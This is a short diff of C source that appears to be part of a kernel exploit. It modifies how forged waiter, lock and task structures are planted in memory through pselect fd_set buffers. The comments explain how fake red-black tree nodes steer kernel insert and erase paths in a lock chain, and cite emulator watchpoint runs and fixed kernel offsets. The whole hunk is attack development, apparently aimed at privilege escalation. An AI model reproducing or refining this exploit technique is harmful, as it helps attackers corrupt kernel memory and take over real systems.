@@ -587,13 +587,16 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
          * = VALUE, root untouched), then the insert links ghost under
          * fake_w0's empty child slot and insert_color sees a BLACK
          * parent → terminates instantly. All reads/writes on page. */
-        /* root = SCRATCH zero node (run-8 freeze decode: fake_w0's pc=1
-         * reads RED -> insert_color walks NULL grandparent -> loop/freeze;
-         * SCRATCH is guaranteed {0,0,0}: BLACK, no children, prio=0 ->
-         * insert links ghost under it and terminates on the black
-         * parent immediately). */
-        ex_stamp[1] = (uint64_t)g_scratch_node;
-        ex_stamp[2] = g_ghost_kva;  /* word12 leftmost = ghost (top)   */
+        /* EMULATOR-FIRED SHAPE (56-run rig conclusion): ALL 4 watchpoint
+         * stops fired ONLY with fake_w0 at BOTH root AND leftmost of the
+         * self-lock — the walk's top_waiter consistency path needs the
+         * SAME page node at both slots, with its payload pc (the W0
+         * main-tree word = write_pc class) giving RED parent_color for
+         * the erase's change_child. fake_w0->lock@+0x38 = fake_lock
+         * (payload) == ghost->lock word7 = fake_lock (default stamp
+         * when no self-lock) — equality passes. This is the delta. */
+        ex_stamp[1] = (uint64_t)fake_w0;
+        ex_stamp[2] = (uint64_t)fake_w0;
         /* owner MUST be >1: the chain exits at owner<=1 BEFORE the
          * delivery erase (historic util.c note: "exits at owner<=1
          * (0x1ee2cc)"). fake_task|1 = the MODE4_OWNER_TASK-proven shape:
